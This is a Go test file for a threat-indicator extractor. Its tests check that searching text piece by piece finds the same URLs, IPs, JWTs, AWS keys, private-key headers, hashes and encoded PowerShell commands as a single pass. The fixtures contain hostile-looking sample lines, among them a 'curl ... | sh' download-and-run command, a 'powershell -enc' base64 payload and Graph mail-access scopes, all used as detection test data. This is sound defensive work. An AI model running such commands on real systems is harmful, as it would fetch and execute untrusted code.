package indicator

import (
	"encoding/json"
	"fmt"
	"math/rand/v2"
	"regexp"
	"slices"
	"sort"
	"strings"
	"testing"
)

// asWritten compiles what a match of each type must not follow as the table
// writes it, to be read from left to right: what Extract, which reads it
// backwards from the match, must equal.
func asWritten(t *testing.T) map[string]*regexp.Regexp {
	t.Helper()
	var entries []entry
	if err := json.Unmarshal(raw, &entries); err != nil {
		t.Fatal(err)
	}
	before := map[string]*regexp.Regexp{}
	for _, e := range entries {
		if e.NotPrecededBy != "" {
			before[e.Type] = regexp.MustCompile(`(?:` + e.NotPrecededBy + `)$`)
		}
	}
	if len(before) == 0 {
		t.Fatal("no type of indicators.json says what it must not follow")
	}
	return before
}

// onePass is Extract as one search of the whole text for each pattern: what
// the searches by piece must equal.
func (t Table) onePass(before map[string]*regexp.Regexp, text string) []Match {
	seen := map[string]bool{}
	var matches []Match
	for _, p := range t.patterns {
		for _, loc := range p.rx.FindAllStringIndex(text, -1) {
			if p.notAfter != nil && p.notAfter.MatchString(text[loc[1]:]) {
				continue
			}
			if rx := before[p.typ]; rx != nil && rx.MatchString(leading(text, loc[0])) {
				continue
			}
			if val := text[loc[0]:loc[1]]; !seen[val] {
				seen[val] = true
				matches = append(matches, Match{Type: p.typ, Value: val, Start: loc[0]})
			}
		}
	}
	sort.Slice(matches, func(i, j int) bool { return matches[i].Start < matches[j].Start })
	return matches
}

// A pattern is searched by piece only when no match of it can cross a line.
func TestStaysInLine(t *testing.T) {
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	var whole []string
	for _, p := range table.patterns {
		if !p.plan.InLine {
			whole = append(whole, p.typ)
		}
	}
	// The space between -EncodedCommand and its payload may be a line break.
	if want := []string{"EncodedCommand"}; !slices.Equal(whole, want) {
		t.Errorf("searched over the whole text: %q, want %q", whole, want)
	}
}

// Every pattern says where it is worth running: it is found by a text its
// matches hold or by the bytes they are made of, so none is run on every line.
func TestEveryPatternNamesItsPlaces(t *testing.T) {
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, p := range table.patterns {
		switch {
		case p.rare != nil:
			got[p.typ] = strings.Join(p.rare, " ")
		case p.plan.Shaped && p.plan.InLine:
			got[p.typ] = "shape"
		default:
			t.Errorf("%s names no place: it is run on the whole of every text", p.typ)
		}
	}
	for typ, want := range map[string]string{
		"URL": "://", "CVE": "cve-", "JWT": ".eyj",
		"AWSKey": "kia sia", "PrivateKey": "private key-----", "EncodedCommand": "-enc",
		"Email": "shape", "IPv4": "shape", "Domain": "shape", "GUID": "shape", "MD5": "shape",
		"SHA1": "shape", "SHA256": "shape", "Base64Blob": "shape",
	} {
		if got[typ] != want {
			t.Errorf("%s is found by %q, want %q", typ, got[typ], want)
		}
	}
}

func TestCut(t *testing.T) {
	line := strings.Repeat("x", 99) + "\n"
	for _, tt := range []struct {
		name, text string
		pieces     int
	}{
		{"empty", "", 1},
		{"short", "a\nb\n", 1},
		{"one long line", strings.Repeat("x", 3*piece), 1},
		{"a long line and no more", strings.Repeat("x", 2*piece) + "\n", 1},
		{"many lines", strings.Repeat(line, 3*piece/len(line)+7), 4},
		{"no line break at the end", strings.Repeat(line, 2*piece/len(line)) + "tail", 2},
	} {
		t.Run(tt.name, func(t *testing.T) {
			bounds := cut(tt.text)
			if len(bounds)-1 != tt.pieces || bounds[0] != 0 || bounds[len(bounds)-1] != len(tt.text) {
				t.Fatalf("cut gives the bounds %v of a text of %d bytes, want %d pieces", bounds, len(tt.text), tt.pieces)
			}
			for i := 1; i < len(bounds)-1; i++ {
				if bounds[i] <= bounds[i-1] || tt.text[bounds[i]-1] != '\n' {
					t.Errorf("the piece that ends at %d does not end a line, or is empty", bounds[i])
				}
			}
		})
	}
}

// Searching a large text by piece gives exactly the matches of one pass,
// whatever falls on the line breaks the pieces are cut at.
func TestExtractByPieceEqualsOnePass(t *testing.T) {
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	lines := []string{
		`{"ts":"2026-10-15T09:36:54Z","src":"144.172.64.%d","request":"GET https://graph.microsoft.com/v1.0/users/%d/messages?$top=50"}`,
		"curl -s http://198.51.100.%d/s.sh | sh  # ops%d@corp.example\r",
		"token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl%d %d",
		"powershell -enc",
		"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ%d%d",
		"d41d8cd98f00b204e9800998ecf8427e 10.0.%d.%d/24 CVE-2026-1234 build01.corp.internal.",
		"scope User.Read.All Mail.Send https://vault%d.vault.azure.net/secrets/s%d",
		"",
		strings.Repeat("QUJDREVGR0hJSktMTU5PUA==", 3) + " %d %d",
		"\u00e910.1.%d.%d\u00e9 x\u00e9d41d8cd98f00b204e9800998ecf8427e\u00e9 caf\u00e9.example.com \u65e5\u672c@example.org",
		"1.2.3.%d.5 9.9.9.%d, (8.8.4.4) [7.7.7.7]\t6.6.6.6/33 Mail.Send( User.Read.All.x",
		"AKIAIOSFODNN7EXAMPL%d ASIAIOSFODNN7EXAMPL%d -----BEGIN RSA PRIVATE KEY-----",
		"0123456789abcdef0123456789abcdef0123456%d 6F9619FF-8B86-D011-B42D-00C04FC964F%d",
	}
	var b strings.Builder
	for i := 0; b.Len() < 2*piece+piece/3; i++ {
		fmt.Fprintf(&b, lines[i%len(lines)], i%250, i)
		b.WriteByte('\n')
	}
	before := asWritten(t)
	for _, tt := range []struct{ name, text string }{
		{"lines", b.String()},
		{"no line break at the end", strings.TrimSuffix(b.String(), "\n")},
		{"a long line among them", b.String()[:piece] + strings.Repeat("10.9.8.7 ", piece/4) + b.String()[piece:]},
		{"small", b.String()[:small-1]},
		{"an indicator at each end", "10.0.0.1 " + b.String()[:small] + "\nops@corp.example"},
		{"a letter that folds", b.String() + "https://login.micro\u017foftonline.com/x \u212aeys.example.com CVE-2026-9999\n"},
		{"a small text that folds", "see HTTP\u017f://198.51.100.7/a and ops@\u212a.example\n" + b.String()[:small/2]},
	} {
		t.Run(tt.name, func(t *testing.T) {
			got, want := table.Extract(tt.text), table.onePass(before, tt.text)
			if len(want) < 100 {
				t.Fatalf("one pass finds %d indicators: the text does not try the pieces", len(want))
			}
			if !slices.Equal(got, want) {
				t.Errorf("by piece: %d indicators, one pass: %d; the two differ", len(got), len(want))
			}
		})
	}
}

// Whatever a text is made of, the search by place finds what one pass finds.
func TestExtractEqualsOnePassOnRandomText(t *testing.T) {
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	parts := []string{
		" ", " ", "\n", "\t", ".", ".", "-", "/", ":", "@", "://", "=", "\"", "'", "(", ")", ",", ";", "\r\n",
		"10", "255", "1.2.3.4", "0", "com", "example", "corp", "io", "a", "Z", "f", "9", "CVE-", "2026", "cve-2024-12345",
		"https", "HTTP", "ftp", "graph.microsoft.com", "login.microsoftonline.com", "vault.azure.net", "/.default",
		"User.Read", "Mail.Send", "offline_access", "eyJhbGciOiJIUzI1NiJ9", "AKIA", "IOSFODNN7EXAMPLE", "-enc", "-EncodedCommand",
		"d41d8cd98f00b204e9800998ecf8427e", "DEADBEEF", "6f9619ff-8b86-d011-b42d-00c04fc964ff", "QUJDREVGR0hJSktMTU5PUA==",
		"-----BEGIN PRIVATE KEY-----", "\u00e9", "\u65e5", "\u017f", "\u212a", "\x7f",
		"version", "Version", "ver", "build", "==", ">=", "^", "~", "Chrome/", "-rc1", "+dev", "0.", "_", "#", "[", "<",
	}
	before := asWritten(t)
	rng := rand.New(rand.NewPCG(1, 2))
	for n := range 400 {
		var b strings.Builder
		size := 200 + rng.IntN(3000)
		if n%200 == 0 {
			size = small + piece
		}
		for b.Len() < size {
			b.WriteString(parts[rng.IntN(len(parts))])
		}
		text := b.String()
		if got, want := table.Extract(text), table.onePass(before, text); !slices.Equal(got, want) {
			t.Fatalf("text %d of %d bytes: by place %d indicators, one pass %d; the two differ", n, len(text), len(got), len(want))
		}
	}
}
